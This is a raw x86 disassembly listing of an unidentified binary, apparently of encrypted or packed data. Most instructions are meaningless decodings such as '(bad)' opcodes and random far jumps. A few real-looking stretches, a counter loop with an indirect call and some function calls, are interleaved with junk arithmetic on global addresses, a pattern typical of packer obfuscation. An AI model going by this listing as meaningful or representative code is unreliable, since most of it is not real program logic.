  40717a:	or     BYTE PTR [ecx+0x606b9770],0x2d
  407181:	sti    
  407182:	fidivr DWORD PTR [ebx]
  407184:	test   bh,al
  407186:	cs push ss
  407188:	cdq    
  407189:	pop    ebx
  40718a:	aaa    
  40718b:	cmc    
  40718c:	popf   
  40718d:	(bad)  
  40718e:	sahf   
  40718f:	adc    DWORD PTR [esp+ebp*1-0x54414e2],ecx
  407196:	std    
  407197:	and    eax,0xe3e5bbbc
  40719c:	mov    bh,0x9a
  40719e:	aas    
  40719f:	push   edi
  4071a0:	adc    al,0xab
  4071a2:	add    ch,dl
  4071a4:	mov    ch,0x66
  4071a6:	in     eax,0x39
  4071a8:	or     dl,al
  4071aa:	jno    0x407137
  4071ac:	ret    0xacd6
  4071af:	lea    eax,[esi]
  4071b1:	cmc    
  4071b2:	je     0x4071d8
  4071b4:	cld    
  4071b5:	xchg   bl,ch
  4071b7:	jb     0x407215
  4071b9:	cmp    DWORD PTR [ecx],esp
  4071bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071bc:	cwde   
  4071bd:	mov    esp,0x164801f3
  4071c2:	mov    ebx,0x76a31c53
  4071c7:	lods   eax,DWORD PTR ds:[esi]
  4071c8:	jb     0x40716d
  4071ca:	and    ecx,DWORD PTR [edi-0x1d241502]
  4071d0:	xor    BYTE PTR [edx],0x30
  4071d3:	aad    0x5b
  4071d5:	icebp  
  4071d6:	pop    ecx
  4071d7:	ins    BYTE PTR es:[edi],dx
  4071d8:	push   edx
  4071d9:	cmp    DWORD PTR [edx],0xffffff95
  4071dc:	shl    DWORD PTR [edx-0x12d68ef0],0x56
  4071e3:	jbe    0x4071c9
  4071e5:	xor    edi,0x20
  4071e8:	(bad)  
  4071e9:	into   
  4071ea:	and    eax,0xf3d7b3f6
  4071ef:	dec    esp
  4071f0:	add    eax,0x6ba8191e
  4071f5:	dec    ecx
  4071f6:	cmp    al,0x23
  4071f8:	in     eax,0x25
  4071fa:	inc    edi
  4071fb:	nop
  4071fc:	add    eax,0xdc79880d
  407201:	jp     0x40723c
  407203:	mov    al,ds:0x14904b5e
  407208:	sahf   
  407209:	inc    eax
  40720a:	cmp    al,0x77
  40720c:	mov    al,ds:0x98e81203
  407211:	adc    BYTE PTR [eax+0x46c37e57],ah
  407217:	mov    edx,0xceb68574
  40721c:	rol    DWORD PTR [ebp+0x60],1
  40721f:	pop    eax
  407220:	jnp    0x407289
  407222:	ins    DWORD PTR es:[edi],dx
  407223:	and    esp,DWORD PTR [edi-0x38]
  407226:	xlat   BYTE PTR ds:[ebx]
  407227:	sti    
  407228:	or     eax,DWORD PTR [edi-0x790af1fd]
  40722e:	ds mov ebx,0xcd7cb857
  407234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407235:	and    BYTE PTR [ebx-0x75],ch
  407238:	in     eax,0xf5
  40723a:	xor    ebp,eax
  40723c:	std    
  40723d:	cwde   
  40723e:	movhps xmm7,QWORD PTR [ecx+eiz*1]
  407242:	icebp  
  407243:	iret   
  407244:	stos   BYTE PTR es:[edi],al
  407245:	dec    edx
  407246:	lea    edx,[edx+0x3b]
  407249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40724a:	clc    
  40724b:	push   esp
  40724c:	adc    DWORD PTR [edx+eiz*8+0x15],eax
  407250:	jbe    0x407275
  407252:	mov    bh,0xcb
  407254:	test   eax,0x2d6e2d84
  407259:	push   ebp
  40725a:	jne    0x4072b9
  40725c:	mov    ds:0xdd6b8ea4,al
  407261:	jne    0x4072c7
  407263:	div    BYTE PTR [edi-0x1c454c53]
  407269:	leave  
  40726a:	or     bh,BYTE PTR [edi-0x2d]
  40726d:	outs   dx,BYTE PTR ds:[esi]
  40726e:	push   ebp
  40726f:	loopne 0x407252
  407271:	mov    edx,0x63a05e68
  407276:	es push ss
  407278:	mov    ecx,0xf8867374
  40727d:	scas   eax,DWORD PTR es:[edi]
  40727e:	jmp    0x8a2:0x18a232f1
  407285:	(bad)  
  407286:	enter  0x489f,0x86
  40728a:	mov    dh,dh
  40728c:	stos   BYTE PTR es:[edi],al
  40728d:	xor    DWORD PTR [ebx+0x1c],ecx
  407290:	pushf  
  407291:	(bad)
  407295:	enter  0xa8d2,0xe
  407299:	cmp    BYTE PTR [ecx],ch
  40729b:	repz or al,0xc3
  40729e:	ss pop ss
  4072a0:	rol    DWORD PTR [edx+0x48369988],1
  4072a6:	adc    eax,0x8d9dfc09
  4072ab:	(bad)  
  4072ac:	or     eax,0xb7dcf917
  4072b1:	mov    eax,0xe7a25d04
  4072b6:	shl    BYTE PTR [ecx+0x7d],cl
  4072b9:	fdivr  QWORD PTR [esi+0x7dc8eea0]
  4072bf:	mov    ds:0x3c90ed5,al
  4072c4:	mov    dl,BYTE PTR [eax+eiz*1]
  4072c7:	ds loop 0x407326
  4072ca:	lds    esp,FWORD PTR [ecx+0x197a9938]
  4072d0:	mov    bl,0xe1
  4072d2:	lock mov bl,0x95
  4072d5:	scas   eax,DWORD PTR es:[edi]
  4072d6:	out    dx,eax
  4072d7:	leave  
  4072d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d9:	inc    edx
  4072da:	push   ss
  4072db:	(bad)  
  4072dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072dd:	adc    esi,DWORD PTR es:[ecx]
  4072e0:	sub    bl,dl
  4072e2:	fwait
  4072e3:	lods   eax,DWORD PTR ds:[esi]
  4072e4:	lds    ecx,FWORD PTR [edi-0x44]
  4072e7:	adc    al,0xb4
  4072e9:	je     0x407343
  4072eb:	push   esi
  4072ec:	push   esi
  4072ed:	mov    ebx,0xf0229166
  4072f2:	and    cl,ah
  4072f4:	stos   BYTE PTR es:[edi],al
  4072f5:	loop   0x4072c0
  4072f7:	xor    edx,eax
  4072f9:	xor    DWORD PTR [ecx+0x4a],edi
  4072fc:	jecxz  0x40736e
  4072fe:	(bad)  
  407300:	clc    
  407301:	and    BYTE PTR [edi-0x449bc9d4],bh
  407307:	aam    0x43
  407309:	cli    
  40730a:	out    0x7f,al
  40730c:	push   ecx
  40730d:	jecxz  0x407293
  40730f:	pop    ebx
  407310:	mov    ch,0xaf
  407312:	cmp    dh,BYTE PTR [ebp+0x2822fafc]
  407318:	xor    DWORD PTR [esi],edi
  40731a:	out    0xb2,al
  40731c:	pushf  
  40731d:	mov    esi,0xbb3757c7
  407322:	fcomp  QWORD PTR [esi-0x66864ed8]
  407328:	xchg   esi,eax
  407329:	clc    
  40732a:	clc    
  40732b:	push   esp
  40732c:	mov    eax,0xe105b64
  407331:	pop    edi
  407332:	jne    0x407382
  407334:	stc    
  407335:	mov    dl,0xc
  407337:	fwait
  407338:	mov    al,BYTE PTR [ebp+0x6e]
  40733b:	and    eax,0x198d2633
  407340:	jle    0x4072cc
  407342:	iret   
  407343:	cwde   
  407344:	xchg   ecx,eax
  407345:	btc    DWORD PTR [ebx+0x581f445],ecx
  40734c:	sar    esp,1
  40734e:	inc    edx
  40734f:	add    BYTE PTR [ebx],al
  407351:	out    0x42,eax
  407353:	add    BYTE PTR [ebx],dh
  407355:	mov    BYTE PTR [ecx+0x42fcfd05],0x0
  40735c:	not    BYTE PTR [edi+0x0]
  40735f:	add    BYTE PTR [ebx],al
  407361:	mov    DWORD PTR [ecx+0x42e70f35],0x2a1100
  40736b:	add    BYTE PTR [ecx+0x45c7e845],cl
  407371:	in     al,0x3c
  407373:	test   DWORD PTR [eax+edi*8+0x67ff45c6],ebx
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	jmp    0x40747b
  4073fd:	data16 std 
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	and    DWORD PTR [esi-0x48],esp
  40740a:	retf   
  40740b:	(bad)  
  40740c:	shl    DWORD PTR [ecx-0x5c1e81e8],cl
  407412:	int    0xf2
  407414:	fwait
  407415:	lea    ebx,[ebp-0x67]
  407418:	lds    edx,FWORD PTR [ecx-0x4cc0e5d9]
  40741e:	jecxz  0x4073d5
  407420:	scas   al,BYTE PTR es:[edi]
  407421:	(bad)  
  407422:	push   edi
  407423:	dec    esi
  407424:	in     al,0x6c
  407426:	push   cs
  407427:	and    al,BYTE PTR [eax-0x78c25dbc]
  40742d:	xor    eax,0x596354b8
  407432:	inc    ebx
  407433:	loope  0x40747c
  407435:	or     DWORD PTR [ebx+0x46],ebp
  407438:	(bad)  
  407439:	mov    cl,0x62
  40743b:	stos   DWORD PTR es:[edi],eax
  40743c:	jno    0x4073e2
  40743e:	aaa    
  40743f:	or     ah,dl
  407441:	jne    0x4074a3
  407443:	mov    dl,0xf
  407445:	les    ebp,FWORD PTR [eax-0x40]
  407448:	(bad)  
  407449:	jmp    0x40745b
  40744b:	arpl   WORD PTR [esp+edi*4+0x4f],ax
  40744f:	adc    ecx,DWORD PTR [esp+ebx*2+0x7a2756be]
  407456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407457:	jb     0x4074c5
  407459:	dec    edx
  40745a:	and    al,0xf8
  40745c:	push   0x2d48c4fa
  407461:	and    BYTE PTR [esi+0x7e],bl
  407464:	inc    edi
  407465:	test   dl,al
  407467:	adc    cl,cl
  407469:	(bad)  
  40746b:	jne    0x40743f
  40746d:	test   DWORD PTR [esi],0x899bddf1
  407473:	sub    ah,ch
  407475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407476:	cmp    DWORD PTR [esi],ebx
  407478:	pop    ss
  407479:	(bad)  
  40747a:	push   ebp
  40747b:	push   ebp
  40747c:	popf   
  40747d:	mov    ebx,0x42a2bfd0
  407482:	call   0x17f0c444
  407487:	scas   al,BYTE PTR es:[edi]
  407488:	or     DWORD PTR ds:0x2a1d85b1,ebp
  40748e:	add    al,0xd6
  407490:	add    al,0x6c
  407492:	stos   BYTE PTR es:[edi],al
  407493:	jo     0x4074dc
  407495:	aas    
  407496:	jns    0x4074b6
  407498:	sti    
  407499:	jge    0x407495
  40749b:	dec    edi
  40749c:	push   edx
  40749d:	lock test al,0x63
  4074a0:	das    
  4074a1:	add    al,0x69
  4074a3:	fcom   DWORD PTR [ebx-0xf]
  4074a6:	mov    esi,0x68d8fc7b
  4074ab:	pop    ecx
  4074ac:	xchg   edx,eax
  4074ad:	rol    dl,cl
  4074af:	xchg   ebx,eax
  4074b0:	mov    bl,0xec
  4074b2:	and    esp,DWORD PTR [esi+eax*1+0x90ba3bd]
  4074b9:	jns    0x407467
  4074bb:	aad    0x1
  4074bd:	mov    edi,0x6e9ecf04
  4074c2:	sbb    eax,0x43305f3f
  4074c7:	xchg   esi,eax
  4074c8:	and    DWORD PTR [eax],0xc73b960
  4074ce:	dec    ebp
  4074cf:	aas    
  4074d0:	cdq    
  4074d1:	loopne 0x4074ea
  4074d3:	sti    
  4074d4:	lods   eax,DWORD PTR fs:[esi]
  4074d6:	mov    WORD PTR [ebp+0x7f773977],gs
  4074dc:	cli    
  4074dd:	xchg   BYTE PTR [eax-0x5709f242],bh
  4074e3:	cmp    BYTE PTR [esi+edi*8],ch
  4074e6:	repz into 
  4074e8:	stc    
  4074e9:	jnp    0x4074aa
  4074eb:	lods   al,BYTE PTR ds:[esi]
  4074ec:	jmp    0xefdd:0x6820ec61
  4074f3:	pop    es
  4074f4:	mov    esi,0x5891bfcd
  4074f9:	call   0xca322047
  4074fe:	repnz sbb eax,0xf66efb34
  407504:	sub    ch,dh
  407506:	loopne 0x4074bb
  407508:	hlt    
  407509:	(bad)  
  40750a:	sahf   
  40750b:	fcomp  QWORD PTR [ebx+0x24bda382]
  407511:	inc    edi
  407512:	ficomp DWORD PTR [ebp-0x4a69af6b]
  407518:	lds    esi,FWORD PTR [esi]
  40751a:	repnz push ebx
  40751c:	gs out dx,al
  40751e:	mov    cl,ch
  407520:	pop    es
  407521:	test   eax,0xd77dc803
  407526:	into   
  407527:	pop    edx
  407528:	ins    BYTE PTR es:[edi],dx
  407529:	fldenv [esi]
  40752b:	gs mov ah,0x23
  40752e:	mov    gs,WORD PTR [eax]
  407530:	test   al,0xfb
  407532:	(bad)  
  407533:	push   ebp
  407534:	ret    0xdaac
  407537:	lea    esp,[eax+0x52]
  40753a:	push   edi
  40753b:	xchg   ebp,eax
  40753c:	xor    dh,BYTE PTR [edx]
  40753e:	test   eax,0x75251a6a
  407543:	fisttp DWORD PTR [edi+eax*2+0x4ee0e4ee]
  40754a:	popa   
  40754b:	pop    ecx
  40754c:	jp     0x407524
  40754e:	xchg   BYTE PTR [eax-0x32],al
  407551:	rcl    DWORD PTR [ebp+0x4eb3c672],0x12
  407558:	push   es
  407559:	jae    0x4075a6
  40755b:	cmp    DWORD PTR [ecx+0x3f375a5c],esi
  407561:	not    DWORD PTR [eax-0x5a4c6be1]
  407567:	int3   
  407568:	push   es
  407569:	ret    0x1874
  40756c:	mov    bl,0x5c
  40756e:	or     al,0xc0
  407570:	aaa    
  407571:	xor    dl,ch
  407573:	jmp    0x4075dc
  407575:	jo     0x4075c5
  407577:	loope  0x40755b
  407579:	add    DWORD PTR [esi+0x4837eacf],0x39fc80d6
  407583:	sbb    BYTE PTR [ebx+ebp*8+0x24],ch
  407587:	jnp    0x407514
  407589:	or     eax,0xc59961f8
  40758e:	mov    dl,0x2f
  407590:	jge    0x407572
  407592:	or     DWORD PTR [esi+eax*4],ecx
  407595:	pop    eax
  407596:	jl     0x4075d2
  407598:	cmp    DWORD PTR [ecx],ebx
  40759a:	mov    eax,0xf3af6c06
  40759f:	and    ecx,DWORD PTR [esp+esi*1-0x12]
  4075a3:	test   al,0xdd
  4075a5:	push   esi
  4075a6:	out    0xb0,eax
  4075a8:	push   eax
  4075a9:	xchg   ebp,eax
  4075aa:	mov    BYTE PTR [esi+edx*2],al
  4075ad:	jmp    0x407593
  4075af:	sub    al,BYTE PTR [eax+0x41fb9cd3]
  4075b5:	xor    DWORD PTR [edi],ebp
  4075b7:	fiadd  DWORD PTR [ebx+0x5c]
  4075ba:	push   0xffffffd7
  4075bc:	aam    0x97
  4075be:	shl    BYTE PTR [ecx+0x14],0x79
  4075c2:	pop    esp
  4075c3:	lea    eax,[esi]
  4075c5:	enter  0x1ac5,0xe1
  4075c9:	or     al,0xcd
  4075cb:	icebp  
  4075cc:	mov    edi,0xcc7ce2e
  4075d1:	pop    esp
  4075d2:	int    0x8a
  4075d4:	mov    bl,0x30
  4075d6:	(bad)  
  4075d7:	rcr    DWORD PTR [eax+edx*1+0x4423f0f],0x2b
  4075df:	lds    edx,FWORD PTR [esi]
  4075e1:	test   al,0x93
  4075e3:	ss xchg esi,eax
  4075e5:	stc    
  4075e6:	mov    dh,0x9e
  4075e8:	mov    eax,0xa1f438d9
  4075ed:	adc    dl,BYTE PTR [eax-0xb9a5d36]
  4075f3:	inc    ebp
  4075f4:	popa   
  4075f5:	xchg   ecx,eax
  4075f6:	sub    ecx,DWORD PTR [esi-0x49]
  4075f9:	out    0xeb,al
  4075fb:	adc    al,0x38
  4075fd:	popa   
  4075fe:	(bad)  
  4075ff:	gs and al,0x9e
  407602:	ror    DWORD PTR [esi+ebp*4-0x5f],cl
  407606:	mov    esi,0xcce04454
  40760b:	lods   eax,DWORD PTR ds:[esi]
  40760c:	cmp    esi,DWORD PTR ds:0x379a16f9
  407612:	and    DWORD PTR [edx],esi
  407614:	bswap  ebp
  407616:	sub    al,0x3a
  407618:	daa    
  407619:	mov    esp,0xc7822f7
  40761e:	pop    esp
  40761f:	dec    ebp
  407620:	mov    al,0x9d
  407622:	sbb    bh,bh
  407624:	or     al,0x67
  407626:	mov    esp,0x67ca61d2
  40762b:	inc    edx
  40762c:	ins    DWORD PTR es:[edi],dx
  40762d:	dec    ebx
  40762e:	fld    DWORD PTR [edx+esi*1+0x1d]
  407632:	or     eax,0x2765fa72
  407637:	pop    ecx
  407638:	and    bl,0x9f
  40763b:	loopne 0x4075db
  40763d:	add    BYTE PTR [edi+0x4be02c08],dl
  407643:	vunpcklpd xmm7,xmm4,XMMWORD PTR [edi+0x65]
  407648:	pop    edi
  407649:	jg     0x407607
  40764b:	xor    DWORD PTR [ebp-0x65],0x6b
  40764f:	data16 or al,0xa1
  407652:	call   ebx
  407654:	cmp    DWORD PTR [edx+0x188ed364],ebx
  40765a:	inc    eax
  40765b:	add    ebx,DWORD PTR [edx+0xde358cf]
  407661:	ins    BYTE PTR es:[edi],dx
  407662:	aam    0xd
  407664:	xor    edx,esi
  407666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407667:	cmp    BYTE PTR [edx+0x7d],0xaf
  40766b:	es mov eax,0xb89b1dfc
  407671:	pushf  
  407672:	or     eax,0x978789bb
  407677:	and    eax,0xa6d582fe
  40767c:	iret   
  40767d:	sete   BYTE PTR [ebx+0x458451b7]
  407684:	xor    ebx,DWORD PTR [esi+ebp*8]
  407687:	inc    DWORD PTR [esi+0x7f33a486]
  40768d:	(bad)  
  40768e:	cwde   
  40768f:	mov    ah,0xe9
  407691:	out    dx,al
  407692:	faddp  st(6),st
  407694:	clc    
  407695:	or     eax,0xba2d2f25
  40769a:	sub    al,0x99
  40769c:	xchg   edx,eax
  40769d:	xchg   edi,ebp
  40769f:	jmp    0x40770d
  4076a1:	jne    0x407674
  4076a3:	rcr    DWORD PTR [edx],0xed
  4076a6:	inc    esi
  4076a7:	mov    dl,0xc8
  4076a9:	imul   ecx,DWORD PTR [edi-0x3],0x0
  4076ad:	push   esi
  4076ae:	mov    ah,bh
  4076b0:	push   eax
  4076b1:	fld    DWORD PTR ds:0x8dc7e349
  4076b7:	fadd   QWORD PTR [edx+esi*8]
  4076ba:	sub    DWORD PTR [edx],0xd4152ba6
  4076c0:	hlt    
  4076c1:	inc    ebx
  4076c2:	push   es
  4076c3:	xor    eax,0xb9325446
  4076c8:	and    DWORD PTR [edx-0x471906c0],ebp
  4076ce:	sub    ch,BYTE PTR [ecx-0x6ba6dc43]
  4076d4:	jb     0x407725
  4076d6:	cdq    
  4076d7:	sub    eax,0x2c53ca88
  4076dc:	fsubr  st,st(3)
  4076de:	sub    bl,BYTE PTR [ebx-0x60c2902a]
  4076e4:	sub    eax,DWORD PTR [edx+ecx*8-0x30]
  4076e8:	sbb    BYTE PTR [esi],0x32
  4076eb:	dec    edi
  4076ec:	ret    
  4076ed:	push   cs
  4076ee:	mov    bl,0xc4
  4076f0:	in     al,dx
  4076f1:	push   ss
  4076f2:	pop    ebx
  4076f3:	jl     0x40771d
  4076f5:	cmp    BYTE PTR [edi+0xa],dl
  4076f8:	sub    esi,DWORD PTR [ebp+0x73]
  4076fb:	aam    0xe3
  4076fd:	lock imul ecx,DWORD PTR [ebx-0x771354e6],0x3a60a5f7
  407708:	call   0xcd8a:0x5dcefade
  40770f:	mov    ds:0xd76f878f,al
  407714:	(bad)  
  407715:	or     edi,DWORD PTR [edi]
  407717:	push   ds
  407718:	sbb    ecx,DWORD PTR [ebp-0x36b47189]
  40771e:	sub    eax,0x48287c7c
  407723:	jmp    0x4ba5:0xbc9a80a9
  40772a:	not    DWORD PTR [esi]
  40772c:	mov    ah,0xec
  40772e:	pop    edx
  40772f:	stos   DWORD PTR es:[edi],eax
  407730:	xchg   edx,eax
  407731:	lods   eax,DWORD PTR ds:[esi]
  407732:	jge    0x4076bb
  407734:	xchg   edi,eax
  407735:	jmp    0xc633:0xdc458bb2
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	inc    ecx
  4077da:	daa    
  4077db:	dec    esp
  4077dc:	jecxz  0x407785
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x40777f
  4077e6:	ins    BYTE PTR es:[edi],dx
  4077e7:	and    eax,0xc4356cdd
  4077ec:	stc    
  4077ed:	lea    eax,[eax+0x4d]
  4077f0:	jecxz  0x4077b8
  4077f2:	pop    esp
  4077f3:	sub    eax,0xe08f62b
  4077f8:	adc    BYTE PTR [edx-0x473deb03],cl
  4077fe:	fcmovnbe st,st(6)
  407800:	imul   eax,DWORD PTR [eax+ebp*4-0x34],0x4d
  407805:	scas   al,BYTE PTR es:[edi]
  407806:	rcr    BYTE PTR [edx-0x40],0x4f
  40780a:	mov    esi,0x6891383b
  40780f:	ficom  DWORD PTR [edi+0x21]
  407812:	sahf   
  407813:	mov    edi,0x92a7f459
  407818:	xor    al,0xd
  40781a:	xchg   ebx,eax
  40781b:	ins    BYTE PTR es:[edi],dx
  40781c:	push   esp
  40781d:	xchg   DWORD PTR [esp+edx*1],edx
  407820:	inc    edx
  407821:	or     cl,BYTE PTR es:[eax+eiz*2]
  407825:	add    esp,0xf6c79d32
  40782b:	mov    es,esi
  40782d:	sbb    dh,ch
  40782f:	xchg   esi,eax
  407830:	mov    ecx,0xe7cfd118
  407835:	ja     0x4077bb
  407837:	jae    0x407822
  407839:	out    0xc,eax
  40783b:	scas   eax,DWORD PTR es:[edi]
  40783c:	and    al,0x8a
  40783e:	adc    esp,DWORD PTR [edi-0x56]
  407841:	pop    esp
  407842:	pop    eax
  407843:	in     al,dx
  407844:	sub    al,0x9e
  407846:	push   edi
  407847:	jb     0x407822
  407849:	pushw  0xffe7
  40784c:	hlt    
  40784d:	pop    edx
  40784e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40784f:	scas   al,BYTE PTR es:[edi]
  407850:	add    ebx,ebx
  407852:	or     BYTE PTR ds:0x5b9c5a7a,0x64
  407859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40785a:	pop    esp
  40785b:	scas   al,BYTE PTR es:[edi]
  40785c:	jo     0x407882
  40785e:	std    
  40785f:	int    0xbf
  407861:	ret    0x3271
  407864:	sub    DWORD PTR [edi-0x67f9a4e0],0xffffffb3
  40786b:	loope  0x407889
  40786d:	inc    edx
  40786e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40786f:	pop    ebx
  407870:	push   ebp
  407871:	jno    0x407899
  407873:	pusha  
  407874:	and    DWORD PTR [ebx+0x34],0x67
  407878:	and    bl,BYTE PTR [edi]
  40787a:	fisubr DWORD PTR [esi+ebp*8]
  40787d:	pop    es
  40787e:	mov    ds:0x5d32d14d,al
  407883:	push   0xb287a2c5
  407888:	xchg   BYTE PTR [edx+0x328c628],cl
  40788e:	sub    DWORD PTR [ecx-0x25bb9a1],ecx
  407894:	cmp    BYTE PTR [ebx-0x68349c3d],al
  40789a:	pop    esp
  40789b:	sbb    eax,DWORD PTR [ebx]
  40789d:	rcr    DWORD PTR [ebx+0x6b],cl
  4078a0:	jmp    0x67a6f967
  4078a5:	ss cld 
  4078a7:	pop    ecx
  4078a8:	mov    edi,0x89167bf7
  4078ad:	sahf   
  4078ae:	or     al,BYTE PTR [eax+0x2e163785]
  4078b4:	test   BYTE PTR [edx],bl
  4078b6:	out    dx,al
  4078b7:	int    0xa7
  4078b9:	imul   edx,DWORD PTR [ebx],0x777771bd
  4078bf:	es xor edx,ecx
  4078c2:	ror    eax,0xa
  4078c5:	shl    eax,cl
  4078c7:	data16 and BYTE PTR [edx+0x76191a9e],ch
  4078ce:	dec    edi
  4078cf:	fdivr  DWORD PTR [ecx]
  4078d1:	call   0x95ed3d76
  4078d6:	test   BYTE PTR [esi+0x7699b743],bl
  4078dc:	xor    dh,BYTE PTR [edi-0x49]
  4078df:	mov    ebx,0xd9290c4
  4078e4:	sub    BYTE PTR [ebx+0x1e92a366],dl
  4078ea:	sti    
  4078eb:	pop    edx
  4078ec:	adc    ah,BYTE PTR [esi]
  4078ee:	adc    DWORD PTR [ecx-0x30f7d318],0xffb208f3
  4078f8:	push   0xf4088230
  4078fd:	inc    ebx
  4078fe:	dec    ebp
  4078ff:	(bad)  
  407900:	jp     0x40792e
  407902:	pop    edx
  407903:	mov    al,ds:0x969199a5
  407908:	dec    esp
  407909:	jne    0x40788e
  40790b:	fild   WORD PTR [eax+0x7e53fa72]
  407911:	push   0x739bbcc4
  407916:	(bad)  
  407917:	(bad)  
  407918:	icebp  
  407919:	(bad)  
  40791a:	imul   esp,eax,0x19
  40791d:	(bad)  
  40791f:	mov    esi,0xaf55ecc9
  407924:	dec    ecx
  407925:	arpl   bx,sp
  407927:	cli    
  407928:	mov    ebp,0x995451e0
  40792d:	lahf   
  40792e:	dec    edx
  40792f:	data16 aaa 
  407931:	mov    bl,0x7d
  407933:	adc    BYTE PTR [edx+0x4d907787],ah
  407939:	mov    ebx,0x535681c9
  40793e:	fisubr WORD PTR [edi]
  407940:	outs   dx,DWORD PTR ds:[esi]
  407941:	lea    esi,[ebp-0x561d526b]
  407947:	sbb    DWORD PTR [ecx],esp
  407949:	adc    al,0xa0
  40794b:	push   0x6ca387cb
  407950:	or     eax,0x9071e5c3
  407955:	outs   dx,DWORD PTR ds:[esi]
  407956:	or     esi,DWORD PTR [ecx]
  407958:	(bad)
  40795b:	dec    edx
  40795c:	jl     0x4079c7
  40795e:	adc    eax,0x8ac8e55d
  407963:	es shl esi,0xdc
  407967:	mov    dh,BYTE PTR ds:0x93afd2c
  40796d:	(bad)  
  40796e:	repz ret 
  407970:	mov    eax,0x59c91c69
  407975:	gs scas eax,DWORD PTR es:[edi]
  407977:	out    0xc5,eax
  407979:	(bad)  
  40797a:	mov    cl,0xcb
  40797c:	cmp    ch,BYTE PTR [edx+0x436bb0dd]
  407982:	push   ds
  407983:	loop   0x4079cc
  407985:	(bad)  
  407986:	mov    ebx,0x7bb60a30
  40798b:	scas   eax,DWORD PTR es:[edi]
  40798c:	or     eax,0x8d6e3e0b
  407991:	xchg   edx,edi
  407993:	rcr    eax,0x5
  407996:	cwde   
  407997:	popf   
  407998:	les    edi,FWORD PTR [esi]
  40799a:	mov    edx,fs
  40799c:	scas   eax,DWORD PTR es:[edi]
  40799d:	sub    BYTE PTR [eax],0x36
  4079a0:	adc    DWORD PTR [edi],ebp
  4079a2:	jo     0x40799a
  4079a4:	jae    0x407a24
  4079a6:	rol    BYTE PTR es:[esi-0x7be5ea31],cl
  4079ad:	(bad)  
  4079ae:	ficomp WORD PTR [ecx]
  4079b0:	adc    BYTE PTR [eax],dl
  4079b2:	sbb    ebp,DWORD PTR [ecx]
  4079b4:	out    dx,eax
  4079b5:	push   0x34aea5a3
  4079ba:	dec    esp
  4079bb:	adc    al,0x14
  4079bd:	gs jne 0x407978
  4079c0:	enter  0x8c19,0xc4
  4079c4:	shr    DWORD PTR [ecx],1
  4079c6:	lea    ecx,[ecx+0x4]
  4079c9:	and    eax,0x1e9ca875
  4079ce:	dec    ebx
  4079cf:	aad    0x6f
  4079d1:	loopne 0x407966
  4079d3:	out    dx,al
  4079d4:	(bad)  
  4079d5:	cmp    DWORD PTR [ecx],ebx
  4079d7:	je     0x407a25
  4079d9:	aam    0x9e
  4079db:	sbb    BYTE PTR [esi-0x3d55a035],ch
  4079e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079e2:	ret    
  4079e3:	dec    edx
